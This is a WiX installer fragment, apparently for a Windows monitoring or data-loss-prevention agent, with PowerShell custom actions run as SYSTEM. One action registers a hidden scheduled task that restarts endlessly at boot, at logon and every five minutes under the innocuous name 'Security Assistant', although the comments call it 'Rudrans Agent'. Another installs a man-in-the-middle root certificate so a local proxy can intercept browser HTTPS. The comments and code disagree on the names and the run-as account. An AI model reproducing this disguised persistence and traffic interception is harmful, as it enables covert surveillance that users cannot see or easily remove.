<?xml version="1.0" encoding="utf-8"?>
<!--
  Service-level persistence for Windows: register a Scheduled Task that
  - runs at every boot (BootTrigger) so the agent comes up before any user logs in
  - runs at every logon (LogonTrigger) so it's always available in the user session
  - re-launches the agent every 5 minutes if it isn't running (Repetition + IdleSettings)
  - has restart-on-failure semantics

  We could install as a true Windows Service (sc.exe / WiX <ServiceInstall>), but the
  agent has a Tauri GUI window for first-time enrollment and Services run in
  Session 0 with no GUI. Scheduled Task in user mode handles this cleanly:
  the watchdog already covers in-process death within ~5s, the Scheduled Task
  is the second-tier safety net for double-kill scenarios.

  Tauri 2 picks this up via tauri.conf.json → bundle.windows.wix.fragmentPaths.
-->
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Fragment>
    <!--
      Register the scheduled task during install. PowerShell is shipped with every
      supported Windows version (10/11) so we don't need extra dependencies.

      Impersonate="no" + Execute="deferred" → runs as SYSTEM with full rights to
      register a task in \Rudrans\Agent. The task itself runs as the
      *interactive user* via -RunLevel Highest with -UserId 'INTERACTIVE'.
    -->
    <CustomAction
      Id="RegisterRudransTask"
      Directory="INSTALLFOLDER"
      ExeCommand='powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "&amp; { $exe = (Get-ChildItem -Path \"[INSTALLFOLDER]\" -Filter rudrans-agent.exe -Recurse | Select-Object -First 1).FullName; if (-not $exe) { exit 0 }; Unregister-ScheduledTask -TaskName \"Rudrans Agent\" -TaskPath \"\\Rudrans\\\" -Confirm:$false -ErrorAction SilentlyContinue; $action = New-ScheduledTaskAction -Execute $exe; $boot = New-ScheduledTaskTrigger -AtStartup; $logon = New-ScheduledTaskTrigger -AtLogOn; $repeat = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue); $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero); $principal = New-ScheduledTaskPrincipal -GroupId \"S-1-5-32-545\" -RunLevel Highest; Register-ScheduledTask -TaskName \"Security Assistant\" -TaskPath \"\\SecurityAssistant\\\" -Action $action -Trigger @($boot,$logon,$repeat) -Settings $settings -Principal $principal -Force }"'
      Execute="deferred"
      Impersonate="no"
      Return="ignore" />

    <!--
      Unregister the scheduled task on uninstall so we don't leave orphan task entries.
    -->
    <CustomAction
      Id="UnregisterRudransTask"
      Directory="INSTALLFOLDER"
      ExeCommand='powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Unregister-ScheduledTask -TaskName \"Security Assistant\" -TaskPath \"\\SecurityAssistant\\\" -Confirm:$false -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"Rudrans Agent\" -TaskPath \"\\Rudrans\\\" -Confirm:$false -ErrorAction SilentlyContinue"'
      Execute="deferred"
      Impersonate="no"
      Return="ignore" />

    <!--
      Email DLP MITM anchor (v0.7.0+).

      Install the CA cert bundled at resources\mitm-ca.crt into the
      LocalMachine\Root store so the agent's local proxy on
      127.0.0.1:47443 can mint leaf certs that Edge / Chrome / Firefox on
      this machine accept without warnings. Corporate domains and
      banking hosts are never intercepted (proxy allowlist), so this
      anchor never signs a leaf for them.

      Deferred + no-impersonate = runs as SYSTEM, which is what
      certutil -addstore -f Root requires. Return="ignore" so a
      pre-existing anchor (upgrade case) doesn't fail the install.
    -->
    <CustomAction
      Id="InstallMitmRootCert"
      Directory="INSTALLFOLDER"
      ExeCommand='powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "&amp; { $cert = (Get-ChildItem -Path \"[INSTALLFOLDER]\" -Filter mitm-ca.crt -Recurse | Select-Object -First 1).FullName; if ($cert) { &amp; certutil.exe -f -addstore Root $cert | Out-Null } }"'
      Execute="deferred"
      Impersonate="no"
      Return="ignore" />

    <CustomAction
      Id="RemoveMitmRootCert"
      Directory="INSTALLFOLDER"
      ExeCommand='powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "&amp; { Get-ChildItem -Path Cert:\\LocalMachine\\Root | Where-Object { $_.Subject -match \"Wellness Extract Root CA\" } | ForEach-Object { Remove-Item -Path $_.PSPath -Force -ErrorAction SilentlyContinue } }"'
      Execute="deferred"
      Impersonate="no"
      Return="ignore" />

    <InstallExecuteSequence>
      <!-- After install completes, register the task. -->
      <Custom Action="RegisterRudransTask" After="InstallFiles">
        NOT Installed AND NOT REMOVE
      </Custom>
      <!-- Right after InstallFiles so the .crt is on disk. -->
      <Custom Action="InstallMitmRootCert" After="RegisterRudransTask">
        NOT Installed AND NOT REMOVE
      </Custom>
      <!-- Before uninstall removes the .exe, drop the task + trust anchor. -->
      <Custom Action="UnregisterRudransTask" Before="RemoveFiles">
        REMOVE="ALL" AND NOT UPGRADINGPRODUCTCODE
      </Custom>
      <Custom Action="RemoveMitmRootCert" Before="RemoveFiles">
        REMOVE="ALL" AND NOT UPGRADINGPRODUCTCODE
      </Custom>
    </InstallExecuteSequence>
  </Fragment>
</Wix>
